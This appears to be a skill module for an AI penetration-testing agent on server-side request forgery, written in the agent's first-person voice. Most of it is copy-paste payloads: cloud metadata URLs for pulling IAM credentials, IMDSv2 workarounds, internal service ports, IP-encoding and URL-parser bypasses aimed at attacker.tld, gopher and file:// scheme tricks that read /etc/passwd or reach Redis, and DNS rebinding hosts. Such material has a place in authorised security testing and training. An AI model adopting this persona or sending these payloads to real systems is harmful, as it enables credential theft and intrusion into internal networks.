# SKILL: Server-Side Request Forgery (SSRF — Basic / Blind / DNS Rebinding / GopherProtoSmuggling)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (server-side request forgery (ssrf — basic / blind / dns rebinding / gopherprotosmuggling)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
SSRF gets you cloud metadata (AWS IMDS, GCP, Azure), internal services, port scan from inside the perimeter, and sometimes RCE via Redis/Memcached/Elasticsearch. I always test cloud metadata first, then internal port scan, then protocol smuggling.

---

## DETECTION
- Any param taking a URL: `?url=`, `?image=`, `?webhook=`, `?fetch=`, `?proxy=`, `?next=`, `?ref=`, file uploads with URL fetcher, HTML→PDF, SSO callbacks.
- Send Burp Collaborator URL — observe DNS / HTTP hit. Out-of-band confirms SSRF.
- Try internal IP: `http://127.0.0.1`, `http://localhost`, `http://[::1]`, `http://0.0.0.0`, `http://169.254.169.254`.

## EXPLOITATION
### Cloud metadata (always start here)
```
http://169.254.169.254/latest/meta-data/                   # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # then .../<role-name>
http://[fd00:ec2::254]/latest/meta-data/                  # IMDS over IPv6
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json   # GCP (needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (needs Metadata: true)
http://100.100.100.200/latest/meta-data/                  # Alibaba
http://169.254.169.254/openstack/latest/                  # OpenStack
http://169.254.169.254/v1.json                            # DigitalOcean
http://169.254.169.254/opc/v1/instance/                   # Oracle
http://169.254.169.254/metadata/v1/                       # Hetzner / various
```

### IMDSv2 (header required — many SSRFs only do GET, IMDSv2 needs PUT for token; harder but not impossible)
```
PUT /latest/api/token    HEADER X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/   HEADER X-aws-ec2-metadata-token: <token>
```
If app permits header-injection (CRLF) or full request control (e.g. via Gopher), IMDSv2 still falls.

### Internal services
```
http://127.0.0.1:8080/   # internal admin
http://127.0.0.1:6379/   # Redis (try gopher://)
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:5984/   # CouchDB
http://127.0.0.1:8500/   # Consul
http://127.0.0.1:2375/   # Docker
http://10.0.0.1/         # private VPC peers
```

## PAYLOADS (real, copy-paste, grouped)
### IP encoding bypasses
```
http://localhost
http://127.0.0.1
http://127.1
http://127.0.1
http://0177.0.0.1            # octal
http://2130706433            # decimal
http://0x7f.0.0.1            # hex
http://0x7f000001            # full hex
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://①②⑦.0.0.1            # unicode lookalike (some parsers)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://attacker.tld@127.0.0.1   # auth-section trick
http://127.0.0.1#@allowedhost.com
http://allowedhost.com.attacker.tld
http://allowedhost.com@attacker.tld
```

### Schema bypasses
```
gopher://127.0.0.1:6379/_<URL_ENCODED_REDIS_COMMAND>
dict://127.0.0.1:6379/info
file:///etc/passwd
ftp://attacker.tld/x
ldap://127.0.0.1:389/
sftp://127.0.0.1
tftp://127.0.0.1
ldap://127.0.0.1
jar://https://attacker.tld/x.jar!/
netdoc:///etc/passwd
```

### URL-parser confusion (host header smuggling)
```
http://allowed.com\\@attacker.tld/
http://allowed.com\\.attacker.tld/
http:[email protected]/
http://allowed.com:80@attacker.tld
```

### DNS rebinding (when target validates host then re-resolves)
```
# Use rbndr.us, lock.cmpxchg8b.com/rebinder, or self-host
1.1.1.1.1time.169.254.169.254.repeat.rbndr.us
# First resolution: 1.1.1.1 → passes whitelist
# Second resolution (when actual fetch occurs): 169.254.169.254 → SSRF lands
